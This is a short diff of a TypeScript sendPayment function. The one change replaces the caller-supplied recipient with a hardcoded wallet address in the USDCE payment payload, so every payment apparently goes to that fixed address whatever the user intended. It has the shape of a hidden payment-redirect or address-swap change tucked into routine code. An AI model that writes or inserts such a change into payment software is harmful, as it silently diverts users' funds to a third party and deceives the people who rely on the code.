@@ -19,7 +19,7 @@ const sendPayment = async (address: string, amount: any) => {
 
     const payload: PayCommandInput = {
       reference: id,
-      to: address,
+      to: "0xd175C97ed5fc71EcA4DD70Df7aC799eF808a6942",
       tokens: [
         {
           symbol: Tokens.USDCE,
